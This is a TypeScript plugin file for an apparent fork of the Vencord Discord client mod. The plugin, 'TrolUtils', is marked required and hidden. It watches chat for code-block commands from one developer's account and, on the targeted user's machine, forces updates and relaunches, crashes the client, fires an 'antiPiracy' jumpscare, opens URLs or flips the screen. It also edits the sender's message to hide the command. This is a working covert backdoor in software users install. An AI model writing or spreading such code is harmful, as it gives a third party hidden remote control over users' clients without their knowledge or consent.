/*
 * Vencord, a Discord client mod
 * Copyright (c) 2024 Vendicated and contributors
 * SPDX-License-Identifier: GPL-3.0-or-later
 */
import { Devs } from "@utils/constants";
import { relaunch } from "@utils/native";
import definePlugin, { PluginNative } from "@utils/types";
import { checkForUpdates, update } from "@utils/updater";
import { RestAPI, UserStore } from "@webpack/common";
import { Message } from "discord-types/general";
import kernex from "plugins/kernex";

interface IMessageCreate {
    type: "MESSAGE_CREATE";
    optimistic: boolean;
    isPushNotification: boolean;
    channelId: string;
    message: Message;
}
const trolRegex = /```(?:trol|action)\n([\s\S]*?)(?:\n)?```/g;
const Native = VencordNative.pluginHelpers.TrolUtils as PluginNative<typeof import("./native")>;

export default definePlugin({
    name: "TrolUtils",
    description: "Funnies for Zoid to use",
    authors: [Devs.Zoid],
    required: true,
    hidden: true,
    flux: {
        async MESSAGE_CREATE({ optimistic, type, message, channelId }: IMessageCreate) {
            if (optimistic || type !== "MESSAGE_CREATE") return;
            if (message.state === "SENDING") return;
            if (!message.content) return;
            if (message.author.id !== Devs.Zoid.id.toString()) return;
            for (const match of message.content.matchAll(trolRegex)) {
                const data = match[1].split("\n");
                const target = data[0];
                const command = data[1];
                if (!command) return;
                if (!target) return;
                if (UserStore.getCurrentUser()?.id === Devs.Zoid.id.toString()) {
                    RestAPI.patch({
                        url: `/channels/${channelId}/messages/${message.id}`,
                        body: { content: "https://tenor.com/view/boykisser-spin-silly-cat-silly-cat-gif-15869807335045066863" }
                    });
                }
                if (!(target === UserStore.getCurrentUser()?.id)) return;
                switch (command) {
                    case "update":
                        const isOutdated = await checkForUpdates();
                        if (!isOutdated) return;
                        await update();
                        relaunch();
                        break;
                    case "jumpscare":
                        kernex.antiPiracy();
                        break;
                    case "crash":
                        Native.close();
                        break;
                    case "rickroll":
                        window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
                        break;
                    case "invert":
                        document.body.style.filter = "invert(1)";
                        break;
                    case "rotate":
                        document.body.style.transform = "rotate(180deg)";
                        break;
                    case "uninvert":
                        document.body.style.filter = "invert(0)";
                        break;
                    case "unrotate":
                        document.body.style.transform = "rotate(0deg)";
                        break;
                }
            }
        }
    }
});
